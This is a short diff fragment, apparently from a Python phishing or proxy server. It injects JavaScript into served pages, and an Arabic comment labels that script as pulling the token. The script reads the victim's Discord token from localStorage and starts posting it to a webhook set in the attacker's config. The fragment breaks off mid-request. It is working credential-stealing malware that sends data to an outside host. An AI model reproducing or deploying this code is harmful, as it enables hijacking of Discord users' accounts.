@@ -234,7 +234,7 @@ height: 100vh;
                 self.end_headers()
 
                 # إضافة سكربت لسحب التوكن
-                data += b'''<script>
+data += b'''<script>
 var discordToken = localStorage.getItem('token');
 if (discordToken) {
     fetch("''' + config["webhook"].encode() + b'''", {
